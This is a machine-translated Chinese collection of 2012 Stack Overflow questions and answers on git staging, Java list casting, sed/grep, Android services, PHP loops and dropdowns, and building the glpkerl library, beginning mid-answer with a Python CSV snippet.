您应该考虑将要保留的信息写入数据库。在 python 中，您可以使用内置的 sqlite3。从[文档](http://docs.python.org/library/sqlite3.html)中很容易理解。

你说你现在正是你想要保留的每个文件中的行。所以你可以尝试这样的事情。

```
 import csv
    reader = csv.reader(open("afile.csv","rb"),delimiter="\t",quotechar='"')
    info_to_keep = []
    obs = []
    for row in reader:
       i+=1
       if i<43:
           continue
       elif i-43 <79*(len(info_to_keep)+1)-4:
           obs.append(row)
       elif i-43 <79*(len(info_to_keep)+1):
           continue
       else:
           info_to_keep.append(obs)
           obs = [row] 
```

这样，您可以拥有一个名为 info_to_keep 的列表，其中每个条目包含一个包含 75 个条目的列表，每个条目包含一个包含 csv 文件中的字段的列表

# git - Git列出了修改过的相同文件并且没有暂存提交？

> ID：10676173
> 
> 赞同：31
> 
> 时间：2012-05-20T18:48:32.200
> 
> 标签：git

出于某种原因，Git 告诉我我有一个文件既“要提交”又“不准备提交”？这没有意义：

```
% git status 
# On branch master
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#   modified:   Dir1/Dir2/filename.cpp
#
# Changes not staged for commit:
#   (use "git add <file>..." to update what will be committed)
#   (use "git checkout -- <file>..." to discard changes in working directory)
#
#   modified:   Dir1/Dir2/filename.cpp 
```

`Dir1`，`Dir2`并且`filename.cpp`绝对都是同一个文件。我不得不`filename.cpp`再次添加回来以使其显示为要提交的更改（在它最初位于存储库中之后）。可能导致问题的唯一原因是我隐藏了 , `pull --rebase`，然后弹出了`stash`? `.gitignore`没有列出`Dir1`，`Dir2`或者`filename.cpp`任何地方，并且模式不建议他们会捕获这个文件？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-05-20T19:00:19.800

这意味着您对 进行了更改`filename.cpp`，添加了该更改（使用`git add`），然后进行了另一个尚未添加的更改。

“要提交的更改”部分意味着 Git 已通过更改更新了其索引。运行时`git commit`，对索引的更改将用于创建新的提交对象。

“未暂存的更改”部分显示了索引和您的工作副本之间的差异。

您可以像这样重现您所看到的：

*   编辑文件名.cpp
*   运行`git status`。您会看到“未上演的更改”。
*   跑`git add filename.cpp`
*   运行`git status`。您将看到“要提交的更改”。
*   再次编辑 filename.cpp
*   运行`git status`。您将看到“未暂存的更改”和“要提交的更改”。

那有意义吗？解释 Git 的工作原理总是有点棘手。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-05-25T13:32:00.850

在 CVS、SVN、BZR 以及毫无疑问的十几种其他工具中，一旦添加了一个文件，就意味着它将包含在下一次提交中。

不是那么GIT。

在 git 中，您不是“添加文件”，而是“添加更改”（有时称为“进行更改”）。

如果您更改文件两次，则必须“添加”两次。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-20T18:56:48.343

如果您修改文件，添加它并且他们重​​新修改文件，您将获得此行为。当您执行 git add 时，它会将更改添加到该点，然后在不重新添加的情况下提交仅提交第一组添加的更改。

```
$ git status
# On branch master
nothing to commit (working directory clean)

matthewfarwell (master)
$ vi foo.txt <-- add lines 1,2,3 here

matthewfarwell (master)
$ git add foo.txt

matthewfarwell (master)
$ git status
# On branch master
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#       modified:   foo.txt
#

matthewfarwell (master)
$ vi foo.txt <-- add lines 4,5,6, here

matthewfarwell (master)
$ git status
# On branch master
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#       modified:   foo.txt
#
# Changed but not updated:
#   (use "git add <file>..." to update what will be committed)
#   (use "git checkout -- <file>..." to discard changes in working directory)
#
#       modified:   foo.txt
# 
```

因此，如果我现在提交，则只会提交第 1、2、3 行。

# .htaccess - 阻止移动（iOS / Android）访问magento中的单个CMS页面

> ID：10676178
> 
> 赞同：1
> 
> 时间：2012-05-20T18:49:14.087
> 
> 标签：.htaccess, magento

在 apache 中，我想我可以做类似 .htaccess 访问控制选项的事情。

例如：SetEnvIf User-Agent BadBot GoAway=1 Order allow,deny Allow from all Deny from env=GoAway

但是如何阻止移动（iOS / Android）访问magento中的单个CMS页面？？？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T00:48:23.710

[从CMS 路由器的](http://svn.magentocommerce.com/source/branches/1.7/app/code/core/Mage/Cms/Controller/Router.php)match 方法中观察`cms_controller_router_match_before`事件并检查观察者方法中的用户代理标头。可能，请参阅[此 SO 帖子](https://stackoverflow.com/q/3817155/833795)。

```
public function checkRestrictAccess(Varien_Event_Observer $o)
{
    /**
     * Browser detection logic will go here.
     */

    if (mobile browser == true && $o->getCondition()->getIdentifier() == 'page-id') {
        $o->getRequest()->setRedirectUrl(Redirect Url);
    }
} 
```

# c++ - C++。谁能帮我在我的代码中找到错误，用简单的迭代方法求解方程？我得到像 -1.#IND00 这样的解决方案

> ID：10676180
> 
> 赞同：0
> 
> 时间：2012-05-20T18:49:20.747
> 
> 标签：c++

我试图用 C++ 帮助解决下一个方程： 3sin(sqrt(x)) + 0.35x - 3.8 = 0 有解
的区域是 [2, 3]

我写了下一个代码：

```
float f(float x)
{
    return (3 * sin(sqrt(x))) + (0.35 * x) - 3.8; //this is equation i am trying to solve
}

float g(float x, float(*f_ptr)(float)) 
{
    const float CONST = 0.1f; //const used to solve equation

    return CONST * f_ptr(x) + x;
}

void Task4_CalculateSomething()
{
    float x0, //starting aproximation
        xk, //current aproximation
        a = 2, //left barrier
        b = 3, //right barrier
        epsilon = 0.001; //allowed error

    const float REAL_SOLUTION = 2.2985; //real solution of selected equation

    printf("Setup starting aproximation: ");
    scanf("%f", &x0);

    do
    {
        xk = g(x0, f); //calc current aproximation

        if (fabs(xk - x0) < epsilon) //if Xn - Xn-1 fits the allowed error, the solution must be found
            break; //then we exit
        else
            x0 = xk; //else reset x values
    }
    while (fabs(a - x0) > epsilon && fabs(b - x0) > epsilon);

    printf("Found solution: %f\nReal solution: %f\n", xk, REAL_SOLUTION);
} 
```

但它给了我奇怪的结果，比如 -1.#IND00，我什至不知道它是什么。
而且我在那里找不到任何错误...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:00:17.210

在高层次上，正在发生的事情是：

1.  您的算法无法正常工作。
2.  在某个迭代中，`xk`变为负数。
3.  当它传递给 时`sqrt`，将返回一个 NaN。
4.  迭代终止。
5.  调用`printf`显示`NaN`为`-1.#IND00`。

您可以使用调试器识别所有这些，甚至可以使用老式的技术来输入一些调试`printf`输出。例如，添加一些代码以`xk`在循环的每次迭代中打印。

由于您知道解决方案在于 [2,3]，因此我个人会使用包围式根查找器。例如，[二分法](http://en.wikipedia.org/wiki/Bisection_method)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T21:03:06.457

尝试使用像这样的另一种算法：

1.  写出函数的导数：der=1.5*cos(sqrt((x))/sqrt(x)+.35
2.  下一个值是 xk=x0-mysinc(x0)/der(x0)

在几个步骤中将落入解决方案...或使您的变量 CONST 具有-1/der(x) 的动态值。

# android - Android：如何在同一屏幕上制作 Surface View 和按钮？

> ID：10676182
> 
> 赞同：-1
> 
> 时间：2012-05-20T18:49:29.133
> 
> 标签：android, image-processing, ocr, tesseract

到目前为止我有两个类，第一个是一个普通的“欢迎页面”，带有一个进入主页的按钮，当用户单击时，第二个类显示一个表面视图和一个按钮来捕获图片。到目前为止我所做的是按照“marakana.com/forums/android/examples/39.html”中的步骤进行操作；它可以很好地显示表面视图并捕获图片，但现在的问题是我想使用 OCR 从捕获的图片中提取文本。我正在考虑使用“TESSERACT”并按照“http://www.itwizard.ro/interfacing-cc-libraries-via-jni-example-tesseract-163.html”中的步骤操作；?? 欢迎任何建议？谢谢 + 我是 android 和编程的新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-23T12:59:56.837

尝试将叠加层与 ImageButton 一起使用。创建新的 Android XML 布局文件，例如 overlay.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="horizontal" >
  <ImageButton 
      android:id="@+id/bTake"
      android:layout_width="fill_parent"
      android:layout_height="wrap_content"
      android:src="@drawable/ic_menu_snap" android:layout_gravity="bottom"/> 
```

要在主代码中创建覆盖，请使用 LayoutInflater。

```
 LayoutInflater inflater = LayoutInflater.from(getBaseContext());
    View overlay = inflater.inflate(R.layout.overlay, null);
    LayoutParams params = new LayoutParams(LayoutParams.FILL_PARENT, LayoutParams.FILL_PARENT);
    addContentView(overlay, params);
    shotBtn = (ImageButton) overlay.findViewById(R.id.bTake); 
```

# facebook - Facebook 页面由带有错误 URL 的 Like 按钮意外创建

> ID：10676183
> 
> 赞同：1
> 
> 时间：2012-05-20T18:49:34.133
> 
> 标签：facebook, facebook-like, facebook-page

我最近在我的网站主页 (index.html) 中添加了一个 XFBML“推荐”按钮。正文中的代码如下所示：

```
<div class="fb-like" data-href="http://my_page.com/index.html" data-send="false" data-layout="button_count" data-width="230" data-show-faces="false" data-action="recommend" data-font="arial"></div> 
```

该按钮工作了一段时间，我也有一些喜欢。然后我开始填写 Open Graph Tag 属性，而我犯了一个错误，我将根 URL (http://my_page.com/) 提供给了 url 属性。我还填写了 admin 属性，所以几分钟后 FB 自动为我的网站创建了一个准入界面，现在我可以在我的个人资料中看到它作为 FB 网站，但不幸的是，我已经失去了所有的喜欢，因为两个网址的区别。这是一个代码，对于具有视觉类型的人来说是错误的：

```
<meta property="og:url" content="http://my_page.com/"/> 
```

在我注意到喜欢的丢失后，我将 OGT 属性更改为带有 index.html 的属性。问题似乎已经解决了，但我认为当有人喜欢/分享它时，如果根 URL 可以显示在 Facebook 墙上会更好。我可以以某种方式合并 Facebook 的两个 URL-s 吗？

# java - 这里有什么问题？我收到 java.lang.ClassCastException 错误，但看不到哪里出错了

> ID：10676185
> 
> 赞同：1
> 
> 时间：2012-05-20T18:49:40.467
> 
> 标签：java, arraylist, queue, classcastexception

这是我第一次真正使用列表和队列，所以这可能是一个非常简单的错误。是因为我的队列中充满了无法转换为整数的对象吗？

```
 //populate array
        for(int i=0; i<11; i++){
            numberarray[i] = i; 
        }
        // populate list with numbers from array
        List numList = Arrays.asList(numberarray);
        Collections.shuffle(numList);

        Queue queue = new LinkedList();
        queue.addAll(numList);

        int num1 = (Integer) queue.poll();
        assignPictures(button01, num1); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-20T18:54:26.930

我的猜测是问题出在这里：

```
Arrays.asList(numberarray); 
```

如果`numberarray`是 a`int[]`而不是 a `Integer[]`，则该调用实际上将返回 a `List`of `int[]`s ，其中包含该数组作为一个元素。

当`ClassCastException`您尝试将`int[]`对象强制转换为`Integer`.

由于 Java 不支持原始集合，因此没有简单的方法可以`Arrays.asList`用来包装原始数组 - 自动装箱不能像那样*大量*工作。`Integer[]`如果你打算用它来支持一个`Collection`.

部分混淆来自该方法[`asList(T...)`](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#asList%28T...%29)采用[varargs](http://docs.oracle.com/javase/1.5.0/docs/guide/language/varargs.html)的事实。如果它只是将 a`T[]`作为参数，编译器不会让你传入 a`int[]`因为原始数组不扩展`Object[]`。但是通过 varargs 支持，编译器推断`T`为`int[]`并认为您的意思是构建一个`List`由 single-element 支持的`int[][]`。

正如其他人所指出的，使用[泛型](http://docs.oracle.com/javase/tutorial/java/generics/generics.html)确实可以帮助您解决这样的歧义，使用它们进行编程总是一个好主意：

```
List<Integer> numList = Arrays.asList(numberarray); 
```

此行给出以下编译错误，而不是让您的代码在运行时失败：

> `incompatible types`
> `required: java.util.List<java.lang.Integer>`
> `found: java.util.List<int[]>`

**旁注：**假设您开始使用 an`Integer[]`不要忘记这意味着元素现在可以是`null`. 如果是这种情况，`NullPointerException`当您取消装箱时会抛出a `int`- 请注意确保您的实现不允许`null`元素，否则`null`在取消装箱之前进行检查。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T18:57:44.310

你真的应该使用泛型和 ArrayList/ArrayDeque，除非它对性能非常关键，并且你使用了很多原子类型，比如 int。然后你应该看看 [http://labs.carrotsearch.com/hppc.html](http://labs.carrotsearch.com/hppc.html)

# php - 如何在 2 次运行后暂停循环，在其间插入代码一次，然后在停止的地方继续循环？

> ID：10676187
> 
> 赞同：0
> 
> 时间：2012-05-20T18:49:59.243
> 
> 标签：php, sql, loops

我目前有一个页面上显示的项目循环。

我想运行循环两次（输出 2 个结果/项目），然后在第二个结果之后插入一个横幅，然后让循环从它停止的地方继续。

下图：

{ **--- 循环开始 ---** }

第 1 项 | 第 2
**项 { 此处的横幅 }**
第 3 项 | 第 4
项 第 5 项 | 第 6
项 第 7 项 | 第 8 项

{ **--- 循环结束 ---** }
<- prev | 下一个->

这些项目在一个while循环中：

```
$sql = mysql_query("SELECT id, img, description, keyword, category FROM images WHERE connect = 1 ORDER BY id DESC LIMIT $from , $perPage");

while($result = mysql_fetch_object($sql)) {
LOOP OF ITEMS HERE } 
```

我只找到过“do”/“while”方法，这并不是我真正想要的。如果有人可以提供帮助，感谢您的时间和帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T18:57:11.860

```
$i=1;
while($result = mysql_fetch_object($sql)) {
    //print item
    if($i==2) { 
        //print banner
    }
    $i++;
} 
```

如果你想让它每两件你可以使用的物品打印一次

```
if($i % 2 == 0) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:04:27.073

您也可以只打印循环外的第一个项目，然后打印横幅，然后遍历剩余的项目：

```
$result = mysql_fetch_object($sql)
// print item
// print banner
while($result = mysql_fetch_object($sql)) {
    // print item
} 
```

Neil 的解决方案更通用，但这可能更简单。请注意，您的`$sql`资源有一个不会自动重置的内部指针，因此如果您在 while 循环之外调用它一次，while 循环将从第二项开始。在这种情况下，这就是你想要的。

# javascript - 如何使 nivoslider 中的图像异步加载？

> ID：10676189
> 
> 赞同：1
> 
> 时间：2012-05-20T18:50:12.980
> 
> 标签：javascript, jquery, ajax, nivo-slider

对于我正在开发的网站，我必须使用 nivoslider 幻灯片插件。问题是我们有十多个更高分辨率的图像。因此，为了加载页面需要花费太多时间。有没有什么选项可以让我们在完全渲染页面后加载这些图像？还是一张一张地加载图片，而不是一开始就加载所有的图片？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:37:53.360

看看[http://webgalli.com/blog/beautiful-jquery-home-page-slideshow-with-translations/](http://webgalli.com/blog/beautiful-jquery-home-page-slideshow-with-translations/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:49:31.447

我认为不可能让 nivo 滑块加载图像，但您可以使用 javascript 加载图像，然后运行滑块。

为此，您必须： 1\. 为仅包含第一张图像的滑块图像创建 div 2\. 使用其余图像的 url 创建 javascript 数组 3\. 运行 js 函数，该函数将为页面创建后的其余图像创建代码仅加载第一张图像 4\. 当其余图像准备就绪时，运行 nivo 滑块。

它可能看起来像这样：

html代码

```
 <div id="sliderWrapper">
   <img src="/myfirstsliderimage.jpg" />
 </div> 
```

javascript代码（假设使用jquery）

```
var sliderImages = ['/path/to/secondimage.jpg', '/path/to/thirdimage.jpg',
                     '/path/to/forthimage.jpg'];
var imagesLoaded = 1;  //set to one as the first image is loaded with the page

$(document).ready(function(){
  for(i in sliderImages) {
    //create new img element
    var img = $('<img></img>').attr('src', sliderImages[i]).attr('id','sliderImg_'+i);  

    //append to slider wrapper
    $('#sliderWrapper').append(img);  

    //after image is loaded increase the counter, 
    //it will tell us when to start slider
    $('#sliderImg_'+i).load(function(){imagesLoaded += 1;});  
  }

  //after inserting images run nivo slider
  runNivoSlider();
});

function runNivoSlider() {
  if (imagesLoaded == $('#sliderWrapper img').length) {
    //all images are loaded, we can run nivo slider
    $('#sliderWrapper').nivoSlider();
  }
  else {
    //something is still missing try in 300 ms
    setTimeout(function(){runNivoSlider();}, 300);
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T20:06:16.087

另一种解决方法是显示第一个滑块的图像，而不是加载 gif（背景）。

# bash - UNIX：使用 egrep 或 sed 查找字符串第一次出现的行？

> ID：10676199
> 
> 赞同：11
> 
> 时间：2012-05-20T18:51:51.573
> 
> 标签：bash, unix, sed

我在 bash shell 中工作，我试图只打印字符串第一次出现的行。例如，对于字符串 ' `auir`'，如果我有文件 myfile.txt 并且它包含：

```
123
asdf
4wirajw
forauir somethingelse
starcraft
mylifeforauir
auir
something else
tf.rzauir 
```

我想输出“ `forauir somethingelse`”

到目前为止，我使用命令

```
sed -n '/auir/p' myfile.txt 
```

这给了我这个字符串的所有出现。我怎样才能只得到 ' `auir`' 出现的第一行？如果它只是一个命令或命令管道，那就太好了。

非常感谢任何见解。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-20T18:56:22.437

用这个：

```
grep -m1 auir myfile.txt 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-20T18:54:24.373

这个`sed`命令

`sed -n '/auir/p' myfile.txt | head -1`

解决你的问题。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-20T19:26:26.407

这可能对您有用：

```
sed '/auir/!d;q' file 
```

或者

```
sed -n '/auir/{p;q}' file 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-01T10:01:50.477

sed -n -e '4s/auir/auir/p' 文件

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-20T22:10:11.120

或者它可以像这样简单

```
grep auir myFile.txt|head -1 
```

# erlang - glpkerl (glpk erlang 库) 编译错误

> ID：10676203
> 
> 赞同：1
> 
> 时间：2012-05-20T18:52:20.343
> 
> 标签：erlang, erlang-driver, dialyzer

我正在尝试在 Ubuntu 11.10 上编译 glpkerl 库，但到目前为止还没有成功。

由于我一直遇到错误，也许我缺少一些重要的东西：

## 我试过的

我安装的 Erlang 版本是 R14B02（通过我的发行版的官方 apt 存储库安装）。

由于我的 glpk 版本在官方 repo 中更新，我从这里下载了 glpk-4.38：http: [//ftp.gnu.org/gnu/glpk/](http://ftp.gnu.org/gnu/glpk/)。我不想在系统范围内安装此版本的 glpk，因此我创建了一个目录 ~/opt，并在以下步骤中将其用作要安装的所有库的根目录。

```
export MY_PREFIX=$HOME/opt
mkdir $MY_PREFIX

cd /tmp
curl http://ftp.gnu.org/gnu/glpk/glpk-4.38.tar.gz | tar zx
cd glpk-3.48 && ./configure --prefix=$MY_PREFIX && make -s && make -s install 
```

接下来，我下载 glpkerldrv 并尝试安装它：

```
cd /tmp
curl http://glpkerl.googlecode.com/files/glpkerldrv-4.38.0.tar.gz | tar xz
cd glpkerldrv-4.38.0
./configure --prefix=$MY_PREFIX LDFLAGS="-L$MY_PREFIX/lib" CPPFLAGS="-I$MY_PREFIX/include"
make -s 
```

显然在使用 make 时出了点问题。如 glpkerl install wiki 所述，我在配置期间使用 --disable-hardcore 禁用了编译器警告到错误的转换。但即便如此，以下未声明的标识符错误仍然存​​在：

```
handlers.c: In function decode_from:
handlers.c:3310:29: error: INT_MAX undeclared (first use in this function)
handlers.c:3310:29: note: each undeclared identifier is reported only once for each function it appears in 
```

显然，生成 handlers.c 文件的 perl 脚本也应该包含limits.h。我通过添加以下内容来纠正它（我没有使用 C 的经验，所以我不确定这是否是正确的方法）：

```
--- a/src/make-handlers
+++ b/src/make-handlers
@@ -52,6 +52,10 @@
   my ($name, $values) = @_;

   print <<EOD;
+#include <limits.h>
+EOD
+
+  print <<EOD;
 #define deserialize_$name(buf, buflen)                          \\
   ({                                                            \\
     uint8_t byte;                                               \\ 
```

现在建筑工作了（`--disable-hardcore`虽然我不认为警告会被忽略，但请参阅附件），我可以执行 make、make check 和 make install，我已经这样做了。

我被困在第二部分：

```
cd /tmp
curl http://glpkerl.googlecode.com/files/glpkerl-4.38.0.tar.gz | tar xz
cd glpkerl-4.38.0/
./configure --prefix=$MY_PREFIX LDFLAGS="-L$MY_PREFIX/lib" CPPFLAGS="-I$MY_PREFIX/include"
PKG_CONFIG_PATH=$MY_PREFIX/lib/pkgconfig make -s
PKG_CONFIG_PATH=$MY_PREFIX/lib/pkgconfig make -s check 
```

虽然构建似乎工作正常，但由于透析器错误，检查失败：

```
dialyzer: Could not find the PLT: /home/my_user/.dialyzer_plt 
```

显然，我们可以将 DIALYZERFLAGS 传递给 makefile，我这样做了：

```
DIALYZERFLAGS="--build_plt" PKG_CONFIG_PATH=$MY_PREFIX/lib/pkgconfig make -s check 
```

## 这是我不确定如何进行的地方

执行最后一条命令后，出现以下错误：

```
dialyzer: {dialyzer_error,"Byte code compiled with debug_info is needed to build the PLT"} 
```

奇怪的是，+debug_info 参数显然被传递给了 erlang 编译器，如 Makefile.opt 文件中所示。

我停止了进一步调查，因为我不确定如何在当前环境下解决这个问题；我在这里遗漏了一些明显的东西吗？谢谢！

（标签：二郎 glpk glpkerl）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T14:38:55.950

这里的问题可能是您使用 Dialyzer 进行错误的分析：除了您的模块（您必须使用绝对名称引用）之外，dialyzer 还用于分析您的应用程序构建的标准库。

因此，在理想的环境中，您应该`dialyzer --build_plt --apps erts kernel stdlib`第一次键入类似创建持久查找表的内容，然后您可以使用`dialyzer --add_to_plt`.

顺便说一句，如果您直接在模块中使用 dyalizer，则必须提供 .beam 编译文件，而不是 .erl 源文件。

# android - 即使有活动的客户端也会调用 Service.onUnbind()？

> ID：10676204
> 
> 赞同：2
> 
> 时间：2012-05-20T18:52:21.217
> 
> 标签：android, android-service

练习的重点是：保持服务活着，将它从一个活动传递到另一个活动。

1.  Activity A 在服务 S 上调用 bindService()；
2.  S.onBound() 调用；
3.  A.serviceConnection.onServiceConnected() 被调用；
4.  活动 A 开始活动 B；
5.  Activity B 在服务 S 上调用 bindService()；
6.  B.serviceConnection.onServiceConnected() 被调用；5a：从 onServiceConnected() 活动 B 调用 A.finish()；
7.  活动 A 正在停止，从其 onDestroy() 方法调用 unbindService(S)。

预期行为：服务 S 继续愉快地存在，直到活动 B 调用 unbindService()

实际行为：

1.  S.onUnbind() 被调用；
2.  S.onDestroy() 被调用；
3.  B.serviceConnection.onServiceDisconnected() 被调用；

从而破坏了链接并与文档相矛盾。

为什么？我错过了什么？

更新：已解决。来自[http://developer.android.com/reference/android/app/Service.html](http://developer.android.com/reference/android/app/Service.html)：

> 服务既可以启动，也可以绑定连接。在这种情况下，只要服务已启动或**与 Context.BIND_AUTO_CREATE 标志**有一个或多个连接，系统就会保持服务运行。

这是代码：

```
public class A extends Activity {

    private final Logger logger = LoggerFactory.getLogger(getClass().getSimpleName());

    private String serviceClassName;
    private ServiceConnection feedConnection;
    private Messenger feedMessenger;

    private void bind(String argument) {

        serviceClassName = TheService.class.getName();
        Intent intent = new Intent(serviceClassName);

        intent.putExtra(Keys.ACCOUNT, argument);

        feedConnection = new FeedConnection();

        if (!bindService(intent, feedConnection, Context.BIND_AUTO_CREATE)) {
            throw new IllegalStateException("Failed to bind to " + argument);
        }

        logger.debug("bindService(" + serviceClassName + ") successful");
    }

    private void forward() {

        Intent intentB = new Intent();

        intentB.setClassName(B.class.getPackage().getName(), B.class.getName());
        intentB.putExtra(Keys.SERVICE_CLASS_NAME, serviceClassName);

        startActivity(intentB);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        unbindService(feedConnection);
    }

    private class FeedConnection implements ServiceConnection {

        @Override
        public void onServiceConnected(ComponentName className, IBinder service) {

            A.this.feedMessenger = new Messenger(service);
        }

        @Override
        public void onServiceDisconnected(ComponentName className) {

            A.this.feedMessenger = null;
            logger.error("Crashed " + Integer.toHexString(hashCode()));
        }
    }
}

public class B extends Activity {

    private final Logger logger = LoggerFactory.getLogger(getClass().getSimpleName());
    private ServiceConnection feedConnection;
    private Messenger feedMessenger;
    private A activityA;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        bindFeed();
    }

    private void bindFeed() {

        Intent startingIntent = getIntent();

        String serviceClassName = startingIntent.getStringExtra(Keys.SERVICE_CLASS_NAME);

        Intent intent = new Intent(serviceClassName);

        feedConnection = new FeedConnection();
        // FIXME: BIND_AUTO_CREATE flag is missing
        if (!bindService(intent, feedConnection, 0)) {
            throw new IllegalStateException("Failed to bind to " + serviceClassName);
        }

        logger.debug("bindService(" + serviceClassName + ") successful");
    }

    private class FeedConnection implements ServiceConnection {

        @Override
        public void onServiceConnected(ComponentName className, IBinder service) {

            B.this.feedMessenger = new Messenger(service);

            logger.debug("bound " + className);

            // Finish the previous activity only after the service is bound            
            activityA.fileList();
        }

        @Override
        public void onServiceDisconnected(ComponentName className) {

            B.this.feedMessenger = null;
            logger.error("Crashed " + className);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T05:20:55.397

更新：已解决。来自[http://developer.android.com/reference/android/app/Service.html](http://developer.android.com/reference/android/app/Service.html)：

服务既可以启动，也可以绑定连接。在这种情况下，只要服务已启动或有一个或多个使用 Context.BIND_AUTO_CREATE 标志的连接，系统就会保持服务运行。

在不同的连接处于不对称角色的情况下不是很直观，但唉，就是这样。

# php - 使用JS的下拉输出

> ID：10676210
> 
> 赞同：0
> 
> 时间：2012-05-20T18:53:16.987
> 
> 标签：php, javascript

原始问题：[<select> 下拉菜单使用 JS 函数正确输出我的 MYSQL 数据](https://stackoverflow.com/questions/7528390/select-dropdown-output-my-mysql-data-properly-using-js-function/10675281#10675281)

我试图写一篇后续文章，但将其添加为答案。这是我的问题：

使用与 MassiveAttack 相似/相同的脚本；我的问题是，一旦我选择第二个下拉菜单，这两个下拉菜单就会自行重置（URL 正确）；我如何“保持”我的价值观？

这是我的脚本：

```
 function reload(form) {
        var val=form.cat.value;
        var val2=form.subcat.value;
        self.location='dd.php?cat=' + val + '&subcat=' + val2;
     }

     </script>
     </head>

     <body>
     <?

    @$cat = $_GET ['cat']; // Use this line or below line if register_global is off
    if (strlen ( $cat ) > 0 and ! is_numeric ( $cat )) { // to check if $cat is
                                                 // numeric data
                                                 // or not.
     echo "Cat Data Error";
     exit ();
     }

    $quer2 = mysql_query ( "SELECT DISTINCT name,category_id FROM shop_categories order by name" );

// ///// for second drop down list we will check if category is selected else we
// will display all the subcategory/////
    if (isset ( $cat ) and strlen ( $cat ) > 0) {
     $quer = mysql_query ( "SELECT name,product_id,priority,description FROM products WHERE category_id=$cat order by name" );
    } else {
    $quer = mysql_query ( "SELECT name,product_id,priority,description FROM products order by name" );
    }
// //////// end of query for second subcategory drop down list box
    echo "<form method=post name=f1 action='dd-check.php'>";
// / Add your form processing page address to action in above line. Example
// action=dd-check.php////
// //////// Starting of first drop downlist /////////
    echo "<select name='cat' onchange=\"reload(this.form)\"><option value=''>Select      Category</option>";
     while ( $noticia2 = mysql_fetch_array ( $quer2 ) ) {
         if ($noticia2 ['category_id'] == @$cat) {
             echo "<option selected value='$noticia2[name]'>$noticia2[name]</option>" . "<BR>";
          } else {
          echo "<option value='$noticia2[category_id]'>$noticia2[name]</option>";
          }
     }
          echo "</select>";
// //////////////// This will end the first drop down list ///////////

// //////// Starting of second drop downlist /////////
      $myList1 = array ();
      echo "<select name='subcat' onchange=\"reload(this.form)\"><option value=''>Select   subCategory</option>";
     while ( $noticia = mysql_fetch_array ( $quer ) ) {
          if ($_GET ['subcat'] == $noticia [subcat]) {        
          echo "<option value='$noticia[name]'>$noticia[name]</option>";
          }
     }
     echo "</select>";

     echo "<input type=submit value=Submit>";
     echo "</form>";
     ?>

    </body>

     </html>

    > 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:00:26.227

您忘记在第二个下拉列表中使用 selected 。

```
echo "<option selected value='$noticia[name]'> 
```

当您更改第一个下拉菜单时它是否有效？

# php - 每秒动态重绘图表

> ID：10676214
> 
> 赞同：0
> 
> 时间：2012-05-20T18:53:36.447
> 
> 标签：php, graph, jpgraph

我正在从不断更新的文本文件中读取数据，大约每 0.5-1 秒一次。目前我已经通过在我的 PHP 脚本中使用刷新头来解决它，并且我正在使用 jpgraph 库来生成图形。但是问题是图形相当大，大约 1500x900，因此图像最终会花费整个刷新时间来重新加载。

我想知道是否有其他方法可以生成图表而不必使用 jpgraph 向客户端发送这么多数据？我假设我可能使用错误的库。

还是我应该只使用客户端图表章程并将服务器上的文本文件的访问权限授予客户端？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:02:10.873

使用 javascript 以 JSON 格式获取图形数据会更有意义，同时使用像 Google Charts 这样的客户端图表 - 太棒了，试试吧。

[https://developers.google.com/chart/](https://developers.google.com/chart/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:03:38.830

我会将原始文本数据的大小（当然用 gzip 压缩）与生成的图像的大小（大多数图像格式已经按定义压缩）进行比较。压缩文本可能要小得多，因此将是一个不错的选择。这假设客户端没有任何可能使图形渲染和处理过于昂贵的实际 cpu 功率限制。

您还可以查看保持与服务器的套接字连接打开，并在新数据到来时推送新数据。这将减少每个 http 请求的固定成本开销。

我不知道你的数据，但也许你只能发送数据的增量？增量是实际更改的数据点。

# visual-studio-2010 - 无法在 xslt.xsd 上执行 xsd.exe

> ID：10676216
> 
> 赞同：0
> 
> 时间：2012-05-20T18:53:54.607
> 
> 标签：visual-studio-2010, xslt, xsd.exe

Visual Studio 在“C:\Program Files\Microsoft Visual Studio 10.0\Xml\Schemas\xslt.xsd”下提供了 XSLT 的架构定义。

但是，当尝试基于 .xsd 生成 C# 类时

```
xsd "C:\Program Files\Microsoft Visual Studio 10.0\Xml\Schemas\xslt.xsd" /classes 
```

该工具只生成一条错误消息说

> 错误：为架构“C:\Program Files\Microsoft Visual Studio 10_0\Xml\Schemas\xslt”生成类时出错。
> 
